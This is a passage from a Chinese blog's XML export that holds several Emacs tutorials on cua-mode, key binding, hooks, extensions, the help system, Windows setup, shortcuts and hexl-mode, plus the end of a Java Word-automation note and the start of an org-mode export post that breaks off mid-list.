<p>所以Dispatch.call()和Dispatch.invoke()方法可以执行Dispatch.put()和Dispatch.set()的操作，反之不可以</p>
<h2 id="Word中的属性参数"><a href="#Word中的属性参数" class="headerlink" title="Word中的属性参数"></a>Word中的属性参数</h2><p>Documents：所有文档</p>
<p>Open：打开文档</p>
<p>ActiveXComponent.Visible：设置编辑器是否可见</p>
<p>Tables：获得所有的表格</p>
<p>Bookmarks：所有标签</p>
<p>Selection：光标所在处或选中的区域</p>
<p>select：选中</p>
<p>typeParagraph：设置为一个段落</p>
<p>ParagraphFormat：段落格式，用alignment设置</p>
<p>alignment：1、居中，2、靠右，3、靠左</p>
<p>Add：新建一个word文档</p>
<p>Close：关闭文档，0不保存，-1保存，-2弹出框确认，注意ComThread.Release();关闭整个word进程</p>
<p>SaveAS：另存为</p>
<p>save：保存</p>
<p>printOut：打印</p>
<p>Application：得到ActiveXComponent的实例</p>
<p>WindowState：Application的属性，表示窗口的大小，0、default，1、maximize，2、minimize</p>
<p>top、left、height、width：application的属性，表示窗口的位置</p>
<p>ActiveXComponent.Quit：关闭所有word文档，但是不退出整个word程序</p>
<p>Range：表示文档中的一个连续范围，由一个起始字符位置和一个终止字符位置定义，进而可以得到格式的信息</p>
<p>Item：得到指定的表格</p>
<p>Rows：得到表格的所有行</p>
<p>Cell：表格的一个单元格</p>
<p>Text：word的文本内容</p>
<p>InsertFile：插入文件</p>
<p>InsertRowsBelow：在指定的行下面插入一行</p>
<p>InsertAfter：在指定对象后插入</p>
<p>Delete：删除，可以是表格的行</p>
<p>Count：返回数目，比如Rows、Tables的数目</p>
<p>Height：返回高度，比如行高、表格行的高</p>
<p>Split：拆分单元格，要指定行数和列数</p>
<p>Merge：合并单元格</p>
<p>Exists：指定的对象是否存在，返回bool值</p>
<p>Copy：复制</p>
<p>Paste：粘贴</p>
<p>Font：字体</p>
<p>Name：字体的名字</p>
<p>Bold：字体是否为粗体</p>
<p>Italic：字体是否为斜体</p>
<p>Underline：字体是否有下划线</p>
<p>Color：颜色</p>
<p>Size：大小</p>
<p>Borders：指定边框，-1为上边框，-2左边框，-3为下边框，-4有右边框，-5为横向边框，-6为纵向边框，-7从左上角开始的斜线，-8从左下角开始的斜线</p>
<p>AutoFitBehavior：自动调整大小，1为内容自动调整大小，2为窗口自动调整大小</p>
<p>Content：去的内容</p>
<p>InLineShapes：</p>
<p>AddPicture：增加一张图片，需要制定路径</p>
<p>homeKey:光标移到开头</p>
<p>moveDown：光标往下一行</p>
<p>moveUp：光标往上一行</p>
<p>moveRight：光标往左一列</p>
<p>moveLeft：光标往右一列</p>
<p>find：要查找的文本</p>
<p>Forward：向前查找</p>
<p>Format：查找的文本格式</p>
<p>MatchCase：大小写匹配</p>
<p>MatchWholeWord：全字匹配</p>
<p>Execute：开始执行查找</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs可视化列模式cua-mode</title>
    <url>/blog/tools/emacs/emacsdiary/cua-mode/</url>
    <content><![CDATA[<p>除了emacs本身支持的列模式外，emacs还可以通过cua-mode支持一种可视化的列模式。在cua-mode下，按[C-return]会进入cua rectangle模式。在这个模式下可以通过鼠标点击确认起点，然后通过光标键来选中一个rect范围，这个rect会用另外的颜色显示出来。</p>
<p>之后我们<br>就可以很方便地对这个rect进行操作。比如[M-up],[M-down],[M-left],[M-right]可以移动这个rect，[C-<br>return]可以取消这个rect，[C-space]可以退出cua-rect模式并激活普通模式下的选择。</p>
<p>直接输入字符: 在每行前(或后)都插入这个字符</p>
<ul>
<li>[M-a]: 将rect中的文字左对齐</li>
<li>[M-b]: 用空格(tabs或者spaces)替换所有rect中的字符</li>
<li>[M-c]: 去掉所有行左侧的空格</li>
<li>[M-f]: 用单个字符替换所有rect中的字符(提示输入一个字符)</li>
<li>[M-i]: 对每行中第一个找到的数字进行加1操作(自动把0x开头的当作十六进制数字)</li>
<li>[M-k]: 剪切rect</li>
<li>[M-l]: 把rect中的内容全部转换为小写</li>
<li>[M-m]: 拷贝rect</li>
<li>[M-n]: 用一串自增的数字替换rect中的每一行(这个功能可以用来给每行编号)<br>### 非常好用的功能</li>
<li>[M-o]: rect的内容右移，选中的rect用空格填充</li>
<li>[M-r]: 用字符串替换符满足正则表达式的字符串</li>
<li>[M-R]: 上下反转</li>
<li>[M-s]: 把rect中的每一行替换为一个字符串(提示输入)</li>
<li>[M-t]: 把rect整个替换为一个字符串(提示输入)</li>
<li>[M-u]: 把rect中的内容全部转换为大写</li>
<li>[M-|]: 对rect执行一个shell命令</li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs快捷键绑定</title>
    <url>/blog/tools/emacs/emacsdiary/emacs-key/</url>
    <content><![CDATA[<p>除了简单地定制Emacs提供的各种功能的行为之外，定制快捷键应该是需求最大的定制方式了。最著名的一个例子应当属于Emacs的set-mark-command了。这是Emacs中最常用的功能之一，它有默认有两个可用的快捷键，一个C-SPC和系统激活输入法的快捷键冲突，另一个C-@按起来太麻烦。一般中日韩的Emacser都会另外设置一个快捷键（英语系的不用输入法，所以不会有C-SPC冲突的情况）。</p>
<p>在Emacs里设置快捷键主要有两种方式，分别通过global-set-key和define-key两个函数来实现。</p>
<h4 id="global-set-key"><a href="#global-set-key" class="headerlink" title="global-set-key"></a>global-set-key</h4><p>顾名思义，global-set-key就是设置全局快捷键了。它的语法是：</p>
<pre><code>(global-set-key key command)
</code></pre>
<p>需要解决两个问题：key写什么？command写什么？</p>
<p>key那里要写成Emacs能明白的形式，有些复杂，幸运的是我们可以让kbd宏来帮忙。首先通过前面讲的C-h k<br>的办法找到快捷键的“标准写法”，例如“M-SPC”，然后把这个“标准写法”放到字符串里面作为kbd宏的参数，它会自动将其转换成Emacs能识别的格式，例如：</p>
<pre><code>(global-set-key (kbd &quot;M-SPC&quot;) &#39;set-mark-command)
</code></pre>
<p>注意要严格按照Emacs告诉你的那个格式写。</p>
<p>至于command那里写什么，通常情况下就是如上面两个例子所示，一个单引号（在Elisp里就表示quote了）加上对应的命令的名字。通常你已经知道自己要绑定的命令的名字了，如果不确定可以通过C-h f 或者 C-h a 来查一下。</p>
<h4 id="define-key"><a href="#define-key" class="headerlink" title="define-key"></a>define-key</h4><p>本来global-set-key应该对应到local-set-key，其实也确实有这么一个函数，用于为当前buffer（通常会影响到当前同一类型的所有buffer），不过一般都直接通过define-key为某个mode设定快捷键映射。用法如下：</p>
<pre><code>(define-key keymap key command)
</code></pre>
<p>其中key和command都是和global-set-key类似的，不过现在需要指定为哪个mode定义快捷键。例如在编辑C程序的时候将F9绑定到编译命令上：</p>
<pre><code>(define-key c-mode-map (kbd &quot;&lt;f9&gt;&quot;) &#39;compile)
</code></pre>
<p>其中c-mode-map就是对应到c-mode的keymap ，一般各个mode都有独立的keymap，并且以mode的名字加上–map 来命名。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs的mode和hook</title>
    <url>/blog/tools/emacs/emacsdiary/emacs-modehook/</url>
    <content><![CDATA[<p>为了适应各种不同的编辑情况，Emacs以mode来组织各种不同的编辑环境。通常每种文件类型有一个独立的major-mode，管理与该文件类型匹配的语法高亮、缩进、注释之类的东西，另外还有一些称作minor-mode的mode，它们可以附加到任意major-mode上，一般是起增强和修饰作用，例如flyspell-mode可以在当前major-mode下打开拼写检查功能。</p>
<p>定制某个特定的mode除了通过设置快捷键和修改一些该mode提供的变量之外，还有一个非常方便的方法：通常major-mode都会提供一个hook，如果遵循命名规范的话，通常是mode的名字加上 –hook，在进入这个major-mode的时候会调用对应的hook里加入的函数，因此可以方便地通过hook来在进入某个mode之后执行一些代码来达到定制的目的。例如：</p>
<pre><code>(add-hook &#39;c-mode-hook
           &#39;(lambda ()
             ;; 自动换行功能
             (c-toggle-auto-newline 1)
             ;; 此模式下，当按Backspace时会删除最多的空格
             (c-toggle-hungry-state)
             ;; 显示目前光标在哪个函数里面
             (which-function-mode t)
             (auto-fill-mode t)
             ;; 不使用 tab 作为缩进字符
             (setq indent-tabs-mode nil)
             (c-subword-mode 1)))
</code></pre>
<p>使用lambda创建一个匿名函数，添加到c-mode的hook里，当进入c-mode的时候（也就是打开一个.c文件的时候）就会调用我们添加进去的那个匿名函数，从而执行函数体里的那些代码，包括打开auto-newline功能、打开c-subword功能等。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs安装扩展</title>
    <url>/blog/tools/emacs/emacsdiary/emacs-plugin/</url>
    <content><![CDATA[<p>虽然Emacs具有高度的可定制性，但是所有事情都自己去做终究是很麻烦的，网上有许多好用的第三方扩展可以直接拿来使用，毕竟重复发明轮子是geek们很忌讳的事情，所以若是你自己也写了一些好用的扩展，别忘了拿到网上去与大家分享！</p>
<p>比较奇怪的是Emacs发展了四十多年，竟然没有一个方便的插件管理系统，像Eclipse的plugin、Firefox的extension以及Textmate的bundle等系统都是很方便的。相比之下Emacs的插件分布就比较分散了（虽然大都能在Emacs wiki上找到），虽然也有一些约定，但是通常各个扩展的安装方法都有一些差异，目前还没有一个统一的管理办法，最好的办法就是安装的时候按照附带的README或者INSTALL文件中描述的步骤来，有些单文件的扩展直接把安装方法写在了文件开头的注释里面。</p>
<p>通常单文件的扩展都提供require的加载方式，只要把文件放到load-path下再require对应的功能就可以了，例如：</p>
<pre><code>(require &#39;template)
</code></pre>
<p>其中 load-path 是Emacs需要加载文件的时候寻找的路径。这实际上是一个list，里面依次列出了Emacs将要查找的路径，就类似于Shell里面的PATH。例如，如果你把要安装的扩展的脚本文件放在~&#x2F;emacs&#x2F;extension<br>中，就可以这样把它加入到 load-path 中：</p>
<pre><code>(add-to-list &#39;load-path
         &quot;~/emacs/extension&quot;
         t)
</code></pre>
<p>最后一个参数t用于指定把你添加的路径加到表的末尾，一般都建议都添加到末尾，但特殊的时候也可以直接加在开头，一般是用于覆盖Emacs自带的一些功能，例如安装独立的speedbar 或者TRAMP 等，需要把单独的扩展的路径加到 load-path的前面，这样在加载的时候就会优先加载第三方的文件而不是 Emacs自带的那些了。</p>
<p>通常我把所有的单文件扩展放在一个目录里，而那些有许多文件的扩展放在他们各自的目录中。比较大的扩展一般提供有Makefile ，可以直接通过make进行安装，它们一般还会安装 Info文档之类的到系统对应的目录中，所以有时候还会需要 root 权限。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs设置变量值</title>
    <url>/blog/tools/emacs/emacsdiary/emacs-setq/</url>
    <content><![CDATA[<p>通常大部分软件都支持的最平凡的定制方式就是设置预定义的一些变量的值了。Emacs中也不例外，可以通过setq设置变量值的方式来进行许多定制，它的基本用法如下所示：</p>
<pre><code>(setq variable value)
</code></pre>
<p>把变量variable设置为值value。其实这是一条最基本的Elisp语句。在Elisp中通常用括号括起来表示一个函数调用，括号里第一个元素是函数名，后面的元素则是函数接受的参数。例如setq就是用于设置变量的值的函数，通过设置变量的值来改变Emacs的工作方式。不过这其实并不是Emacs中最常用的定制方式，我们平时用得最多的应该还是函数调用式的，通过调用预定义的函数来加载、打开或者关闭某个功能。比如：</p>
<pre><code>(mouse-avoidance-mode &#39;jump)  ; 光标靠近鼠标时让鼠标自动走开
(tool-bar-mode -1)            ; 关闭工具栏
</code></pre>
<p>下面一个定制 ido 的例子应该是个典型了，首先通过require函数加载ido，然后通过设置ido预定义的一些变量来定制ido的行为，最后通过调用ido-mode函数来打开ido功能：</p>
<pre><code>(require &#39;ido)
(setq ido-enable-prefix nil)
(setq ido-enable-case nil)
(ido-mode t)
</code></pre>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs帮助系统的使用</title>
    <url>/blog/tools/emacs/emacsdiary/emacshelp/</url>
    <content><![CDATA[<p>基本上所有的Emacs帮助命令都以C-h为前缀。</p>
<h4 id="C-h-t"><a href="#C-h-t" class="headerlink" title="C-h t"></a>C-h t</h4><p>打开Emacs的入门教程，我想这应该是大多数人都推荐每一个初学者首先应该看的东西吧，包括需要熟悉的一些基本概念和常用快捷键的介绍和练习等。同其他Emacs的官方文档不同，这个入门教程有各国语言的版本，其中还包括一个简体中文的版本，如果你的Emacs版本比较新的话，应该已经带有简体中文的版本了。Emacs会根据你的语言设置自动选择合适的版本。</p>
<h4 id="C-h-k"><a href="#C-h-k" class="headerlink" title="C-h k"></a>C-h k</h4><p>让 Emacs 告诉你某个快捷键是什么作用。首先按下 C-h k ，然后 Emacs会等待你按下你想要知道的快捷键，之后它会告诉你你按了什么键，这个键绑定到了什么命令上（如果有的话）以及该命令的介绍。还有一个很巧妙的用处就是在你定制快捷键却不知道这个快捷键该如何写的时候，就让Emacs来告诉你。</p>
<p>比如你想要把 “Alt+空格”绑定到 set-mark-command上，可是又不知道“Alt+空格”在 Emacs 里应该如何表示，并且经过试验发现“M-”是不行的。这个时候就需要 C-h k 来帮忙了。按下 C-h k 再按下“Alt+空格”。</p>
<p>另外，在 Emacs 中，快捷键并不只局限于键盘，试着按下 C-h k，然后用鼠标选择菜单栏中的某一个菜单项，看看 Emacs说什么？</p>
<p>它还有一个同胞兄弟 C-h K ，注意这次是大写的 K。对于Emacs的一些内部命令，除了Elisp源代码中提供的文档以外，还有一个专门的Info 文档进行了系统的介绍。C-h K 就是定位到 Info文档中描述该命令的位置。</p>
<h4 id="C-h-f"><a href="#C-h-f" class="headerlink" title="C-h f"></a>C-h f</h4><p>按下 C-h f 并输入函数名（可以通过 tab 来补全），Emacs就会给你该函数的详细描述。除此之外，如果这是一个绑定到了某个快捷键上的命令，Emacs还会显示出该快捷键，这个功能非常贴心！</p>
<p>如果你有相应函数的源代码，点击Emacs给的链接可以直接定位到源码中函数的定义处。在Debian中只需要安装对应的emacs-el包就可以直接定位到Emacs自带的Elisp 源代码中了。如果是你自己编译的Emacs，甚至连“car”这种由C语言编写的基础核心函数也能直接定位到相应的C代码！</p>
<h4 id="C-h-v"><a href="#C-h-v" class="headerlink" title="C-h v"></a>C-h v</h4><p>说起自定义程序的话，最基本的方式应该是设置一些预定义的变量了，Emacs中也不例外。例如，通过设置 inhibit-startup-message变量，可以禁用启动画面。可是有这么多的变量，不可能全部记住。这个时候又需要Emacs 的在线帮助系统来帮忙了。</p>
<p>按下 C-h v ，然后输入变量名（同 C-h f 以及许多其他命令一样，可以通过 tab来补全），Emacs就会告诉你该变量的出处、变量的作者给出的帮助信息以及变量当前的值。同函数一样，也可以通过点击链接的形式直接打开源文件并定位到该变量定义的地方。</p>
<p>更可贵的是，这些在线帮助以及索引是Emacs自动生成的，只要在书写Elisp代码的时候遵循一定的约定，在Elisp文件被加载的时候，文件里定义的变量以及函数相关的文档就被Emacs加载进索引中了，完全不需要额外的干预。</p>
<h4 id="C-h-m"><a href="#C-h-m" class="headerlink" title="C-h m"></a>C-h m</h4><p>Emacs为不同的文件类型提供不同的编辑环境，称作mode。有时候想要得到关于当前mode的使用帮助、状态描述以及可用的快捷键列表等，只需要按下C-hm就一目了然了！</p>
<h4 id="…-C-h"><a href="#…-C-h" class="headerlink" title="… C-h"></a>… C-h</h4><p>有芝麻开门，自然就有芝麻关门！C-h可以当前缀用，也可以当后缀用。我时常记不住矩形操作的几个快捷键，但是我知道它们是以C-xr 为前缀的，于是我按下 C-x r ，然后再按下 C-h ，Emacs 就会列出所有以 C-x<br>r为前缀的快捷键以及对应的命令了。实际上这个功能应当是Emacs中最鲜为人知的小技巧之一了。</p>
<h4 id="C-h-C-h"><a href="#C-h-C-h" class="headerlink" title="C-h C-h"></a>C-h C-h</h4><p>作为一个最大的例外，C-h C-h 并不是列出所有以 C-h为前缀的快捷键，而是给出许多帮助相关的选项。如果记不住前面的几个快捷键，只需要记住C-h C-h即可，Emacs会给你必要的提示，包括前面介绍的以及其他更多的帮助选项。</p>
<h4 id="更模糊的查找"><a href="#更模糊的查找" class="headerlink" title="更模糊的查找"></a>更模糊的查找</h4><p>虽然 C-h f 和 C-h v 可以使用 tab进行补全，但是必须要知道一个前缀才行。有些时候只知道一个关键字，却不一定是前缀，这个时候可以用C-h a来通过正则表达式来查找命令名。Emacs会列出所有匹配的命令以及一个简短的文档，并可以通过点击链接定位到该命令的详细文档。</p>
<p>C-h a 只会查找命令，如果需要匹配所有的函数以及变量的话，可以使用 M-x apropos 。如果这都找不到想要的结果的话，你可以考虑用 C-h i来打开Emacs的Info文档尝试通过目录结构和索引找到自己想要的东西。当然 Info其实本质上是一个文本文件，所以这个时候可以使用Emacs的查找或者正则表达式查找功能直接搜索Info文档，这个比apropos好的地方是关键字并不局限于函数或变量的名字。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs安装配置</title>
    <url>/blog/tools/emacs/emacsdiary/emacsinstall/</url>
    <content><![CDATA[<h2 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h2><p>官网：<a href="http://ftp.gnu.org/gnu/emacs/">http://ftp.gnu.org/gnu/emacs/</a></p>
<p>Windows版下载：<a href="http://ftp.gnu.org/gnu/emacs/windows/">http://ftp.gnu.org/gnu/emacs/windows/</a></p>
<p>请选择24以上的版本</p>
<h2 id="Windows版安装"><a href="#Windows版安装" class="headerlink" title="Windows版安装"></a>Windows版安装</h2><p>不需要安装，解压缩到某个路径就可以了</p>
<p>为了方便全局调用，请添加bin路径到环境变量（比如我的，C:\emacs\bin）。你可能需要先了解下环境变量和命令行的基本知识。搜索关键词“windows环境变量PATH”，“启动cmd”</p>
<p>测试下，在cmd里，输入emacs -nw[2]，以终端模式来运行emacs；只输入emacs，以GUI模式来运行</p>
<p>文档介绍了bin目录下各个exe文件的功能，也介绍了怎样完全卸载，直接删除就好</p>
<p>解压缩完成后，可以运行bin\addpm.exe，这样会自动生成配置文件.emac和目录.emacs.d，并且在启动菜单里添加应用程序快捷方式。</p>
<p>可以在桌面上新建一个快捷方式（shortcut），位置（location）填入emacs的安装路径\bin\runemacs.exe –debug-init。加了flag –debug-init，是为了方便调试（debug）配置文件。不推荐为emacs.exe建立快捷方式，因为会额外启动一个命令行窗口。</p>
<h2 id="HOME"><a href="#HOME" class="headerlink" title="HOME"></a>HOME</h2><p>Emacs配置文档常见的文件名有两个，.emacs，<br>init.el，虽然本质上它们都是elisp脚本。你可以用任何文本编辑器来编辑他们。</p>
<p>Emacs会在系统中寻找一个名为HOME的变量，然后拷贝一个副本供自己使用，并在其指定的路径下寻找配置文件</p>
<p>windows平台，在cmd使用echo %userprofile%来查看HOME。</p>
<p>对于windows<br>7&#x2F;8&#x2F;8.1，如果你的环境变量和注册表里都没有HOME，emacs会把%userprofile%的值设置为HOME，一般是</p>
<p>C:\Users\your-user-name\AppData\Roaming</p>
<p>通常，emacs会优先加载.emacs，如果找不到，并且存在文件夹.emacs.d，会尝试加载其中的init.el</p>
<h2 id="一个比较好的安装配置方案"><a href="#一个比较好的安装配置方案" class="headerlink" title="一个比较好的安装配置方案"></a>一个比较好的安装配置方案</h2><p>将emacs的压缩包解压到某个路径</p>
<p>运行bin路径下的runemacs.exe</p>
<p>c-x d ~ RET，编辑区域左上角的文件路径即emacs的HOME。或者键入C-h v user-init-file并查看返回值。</p>
<p>在HOME路径下，emacs会自动生成.emacs.d文件夹，如果没有请自己建立</p>
<p>在该文件夹下新建init.el，输入如下代码</p>
<pre><code>;; This file is only for windows 7/8/8.1
;; The only thing it does is to set the HOME directories for emacs,
;; then trigger the init.el in the directory specified by HOME to
;; accomplish the true initialization
;; You should put this file in the **default** HOME directory right after
;; emacs is installed
(setenv &quot;HOME&quot; &quot;C:/emacs/&quot;) ;; 改成你的Emacs解压位置
(load &quot;~/.emacs.d/init.el&quot;)
</code></pre>
<p>最后一行代码中，~代表emacs的HOME路径。由于前面已经重新设定HOME，所以这行代码相当于调用C:&#x2F;emacs&#x2F;.emacs.d&#x2F;下的init.el。</p>
<p>顺便删掉前面几步中你见到的任何.emacs文件，保证emacs利用init.el启动</p>
<p>这样做的好处是，除了可以自定义.emacs.d所在的路径，还可以方便的备份整个文件夹，因为插件通常会被安装到这个文件夹下。如果需要换到其他电脑甚至平台时，只需要把整个文件夹复制过去，然后类似于上述步骤那样，想办法让真正的init.el发挥作用即可。</p>
<p>使用init.el而不是.emacs来配置，可以保证配置文件的结构化和模块化，方便维护。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs快速入门</title>
    <url>/blog/tools/emacs/emacsdiary/emacsksrm/</url>
    <content><![CDATA[<p>Emacs的基本编辑功能并不复杂，这里主要介绍Emacs的常用编辑功能。</p>
<h2 id="控制键"><a href="#控制键" class="headerlink" title="控制键"></a>控制键</h2><p>Emacs 键盘命令通常包含 CONTROL 键（有时候以 CTRL 或 CTL 来标示）和META键（有时候用 EDIT 或 ALT<br>来标示）。为了避免每次都要写出全名，我们约定使用下述缩写：</p>
<p>C-:表示当输入字符 时按住 CONTROL 键。因此 C-f 就表示：按住 CONTROL键再输入 f。</p>
<p>M-: 表示当输入字符 时按住 META（或 EDIT 或 ALT）键。如果你的键盘上没有META 、EDIT 或 ALT 键，用下述方法也等效：先按一下 ESC 键然后放开，再输入。我们用 来表示ESC 键。</p>
<p>通常的惯例是：META系列组合键用来操作“由语言定义的单位（比如词、句子、段落）”，而CONTROL系列组合键用来操作“与语言无关的基本单位（比如字符、行等等）”。</p>
<p>CTRL有很多按法，推荐用两手小拇指按，一手按CTRL一手按字母。</p>
<p>ALT推荐用两手大拇指，一手按ALT一手按字母。</p>
<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><ul>
<li>C-x C-f：寻找文件。</li>
<li>C-x C-s：保存文件</li>
<li>C-x C-b：列出缓冲区</li>
<li>C-x C-c：离开 Emacs</li>
<li>C-x 1：关掉其它所有窗格，只保留一个</li>
<li>C-x u：撤销</li>
</ul>
<h2 id="滚屏"><a href="#滚屏" class="headerlink" title="滚屏"></a>滚屏</h2><ul>
<li>C-v:向前移动一屏</li>
<li>M-v:向后移动一屏</li>
<li>C-l:重绘屏幕，并将光标所在行置于屏幕的中央</li>
</ul>
<h2 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h2><pre><code>                  上一行 C-p
                       :
                       :
 向左移 C-b .... 目前光标位置 .... 向右移 C-f
                       :
                       :
                  下一行 C-n
</code></pre>
<ul>
<li>C-b:B 代表 backward（回退）</li>
<li>C-f:F 则代表 forward（前进）</li>
<li>C-p:P 代表 previous（上一行）</li>
<li>C-n:N 代表 next（下一行）</li>
</ul>
<p>按单词移动,这里的“词”指英文单词，对中文来说，则是指移动到下一个标点符号：</p>
<ul>
<li>M-f:(META-f) 向前移动一个词</li>
<li>M-b:向后移动一个词</li>
</ul>
<p>移动动到首尾：</p>
<ul>
<li>C-a：移动到行首</li>
<li>C-e：移动到行尾</li>
<li>M-a：移动到句首</li>
<li>M-e：移动到句尾</li>
<li>M-&lt;：移到文件最开始</li>
<li>M-&gt;：移到文件最末尾</li>
</ul>
<h2 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h2><p>命令参数最常用的是重复执行命令。</p>
<p>输入方法：先输入 C-u，然后输入数字作为参数，最后再输入命令。</p>
<p>例：向前移动 8 个字符</p>
<pre><code> C-u 8 C-f
</code></pre>
<p>例：输入相同字符，插入 ********</p>
<pre><code> C-u 8 *
</code></pre>
<h2 id="终止命令"><a href="#终止命令" class="headerlink" title="终止命令"></a>终止命令</h2><p>如果 Emacs 对你的命令失去响应，你可以用 C-g来安全地终止这条命令。C-g也可以终止一条执行过久的命令。</p>
<p>C-g 还可以取消数字参数和只输入到一半的命令。</p>
<h2 id="删除剪切内容"><a href="#删除剪切内容" class="headerlink" title="删除剪切内容"></a>删除剪切内容</h2><p>Emacs的编辑和普通的编辑器的输入删除一样，这里介绍几个删除的快捷键：</p>
<ul>
<li>C-d:删除光标后的一个字符</li>
<li>M-d:移除（剪切）光标后的一个词</li>
<li>C-k:移除（剪切）从光标到“行尾”间的字符</li>
<li>M-k:移除（剪切）从光标到“句尾”间的字符</li>
<li>C-w:移除（剪切）区块</li>
<li>M-w:复制区块</li>
</ul>
<p>注意,“移除（kill）”和“删除（delete）”的不同在于被移除的东西可以被重新插入（在任何位置），而被删除的就不能使用相同的方法重新插入了。</p>
<p>一般而言，那些可能消除很多文字的命令会把消除掉的文字记录下来（它们被设定成了“可召回”），而那些只消除一个字符或者只消除空白的命令就不会记录被消除的内容（自然你也就无法召回了）。</p>
<h2 id="粘贴-x2F-召回内容"><a href="#粘贴-x2F-召回内容" class="headerlink" title="粘贴&#x2F;召回内容"></a>粘贴&#x2F;召回内容</h2><ul>
<li>C-y:光标所在处插入你最后移除的文字。</li>
<li>M-y:召回再前一次被移除的内容，可以一直向前召回。</li>
</ul>
<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><ul>
<li>C-s:向前搜索</li>
<li>C-r:向后搜索</li>
</ul>
<p>按回车可以结束搜索,如果想搜索下一个结果就按C-s&#x2F;C-r</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs编辑二进制文件</title>
    <url>/blog/tools/emacs/emacsdiary/hexl-mode/</url>
    <content><![CDATA[<p>ALT+X hexl-mode 进入16进制模式</p>
<p>选中你要修改的位置</p>
<p>ALT+X hexl-insert-hex-char 插入16进制字符</p>
<p>或者</p>
<p>CTRL+ALT+X 命令</p>
<p>然后输入16进制数回车</p>
<p>比如输入40,就代表0x40.</p>
<p>退出命令</p>
<p>ALX+X hexl-mode-exit</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs窗口和缓冲区快捷键</title>
    <url>/blog/tools/emacs/emacsdiary/winbufshutkey/</url>
    <content><![CDATA[<h2 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h2><ul>
<li>C-x 1 :最大化当前窗口</li>
<li>C-x o :光标移到其他窗口</li>
<li>C-x 2 :对窗口水平分割</li>
<li>C-x 3 :对窗口垂直分割</li>
<li>C-x 0 :关闭当前窗口</li>
</ul>
<h2 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h2><ul>
<li>C-x C-f :打开或创建文件</li>
<li>C-x C-b :显示buffer列表，可以用方向键选择</li>
<li>C-x C-w :另存为</li>
<li>C-x b :switch-to-buffer</li>
<li>C-x k :kill buffer</li>
<li>C-x C-s :save buffer</li>
<li>C-x C-c :save buffer and kill terminal</li>
<li>C-x ← :pervious buffer</li>
<li>C-x → :next buffer</li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs org-mode之导出发布</title>
    <url>/blog/tools/emacs/org-mode/export/</url>
    <content><![CDATA[<p>Org-mode可以完美的编辑，但是最终文档可能需要发布成其他的格式。 Org-Mode<br>支持多种文档的输出，包括：</p>
<ul>
<li>文本</li>
<li>网页</li>
<li>PDF（需要 Latex 支持）</li>
<li>XOXO</li>
<li>FreeMind&#x2F;Xmind</li>
<li>Docbook</li>
<li>iCalendar（苹果 iCal 文件）</li>
<li>……</li>
</ul>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>为了更好的发布文档，还需要做一些准备工作。主要是为文档添加一些”元数据“，使得发布的时候能更好地识别文档的内容。</p>
<h4 id="文档元数据"><a href="#文档元数据" class="headerlink" title="文档元数据"></a>文档元数据</h4><p>具体包括：</p>
<pre><code>#+TITLE:       the title to be shown (default is the buffer name)
#+AUTHOR:      the author (default taken from user-full-name)
#+DATE:        a date, an Org timestamp1, or a format string for format-time-string
#+EMAIL:       his/her email address (default from user-mail-address)
#+DESCRIPTION: the page description, e.g. for the XHTML meta tag
#+KEYWORDS:    the page keywords, e.g. for the XHTML meta tag
#+LANGUAGE:    language for HTML, e.g. ‘en’ (org-export-default-language)
#+TEXT:        Some descriptive text to be inserted at the beginning.
#+TEXT:        Several lines may be given.
#+OPTIONS:     H:2 num:t toc:t \n:nil @:t ::t |:t ^:t f:t TeX:t ...
#+BIND:        lisp-var lisp-val, e.g.: org-export-latex-low-levels itemize
               You need to confirm using these, or configure org-export-allow-BIND
#+LINK_UP:     the ``up&#39;&#39; link of an exported page
#+LINK_HOME:   the ``home&#39;&#39; link of an exported page
#+LATEX_HEADER: extra line(s) for the LaTeX header, like \usepackage&#123;xyz&#125;
#+EXPORT_SELECT_TAGS:   Tags that select a tree for export
#+EXPORT_EXCLUDE_TAGS:  Tags that exclude a tree from export
#+XSLT:        the XSLT stylesheet used by DocBook exporter to generate FO file
</code></pre>
<p>其中#+OPTIONS是复合的选项，包括：</p>
<pre><code>H:         set the number of headline levels for export
num:       turn on/off section-numbers
toc:       turn on/off table of contents, or set level limit (integer)
